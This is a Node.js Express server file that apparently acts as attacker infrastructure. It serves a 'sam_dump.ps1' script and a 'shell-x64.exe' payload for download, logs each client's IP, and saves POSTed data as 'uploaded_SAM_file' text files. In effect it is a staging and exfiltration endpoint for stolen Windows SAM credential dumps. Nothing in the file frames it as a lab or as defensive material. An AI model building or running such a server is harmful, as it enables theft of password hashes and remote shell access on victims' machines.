const fs = require('fs');
const path = require('path');
const morgan = require('morgan');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Define a custom token for morgan to log only the IP address
morgan.token('client-ip', function (req, res) {
  return req.ip;
});

// Logging middleware with custom token
app.use(morgan(':client-ip', { immediate: true }));

// Set up body parser middleware
app.use(bodyParser.raw({ type: '*/*' }));

app.get('/sam_dump.ps1', (req, res) => {
  res.sendFile('./sam_dump.ps1', { root: __dirname });
});

app.get('/shell-x64.exe', (req, res) => {
  res.sendFile('./shell-x64.exe', { root: __dirname });
});

// Route for handling file upload
app.post('/upload', (req, res) => {
    try {
        // Decode data from the request body
        const decodedData = req.body;
        
        // Generate a unique filename based on timestamp
        const timestamp = Date.now();
        const filename = `uploaded_SAM_file_${timestamp}.txt`;
        const filePath = path.join(__dirname, filename);
        
        // Save the decoded data to a file
        fs.writeFile(filePath, decodedData, (err) => {
            if (err) {
                console.error('Error saving uploaded file:', err);
                res.status(500).send('Internal Server Error');
            } else {
                console.log('File saved successfully:', filename);
                res.status(200).send('200');
            }
        });
    } catch (error) {
        console.error('Error handling upload:', error);
        res.status(400).send('Bad Request');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
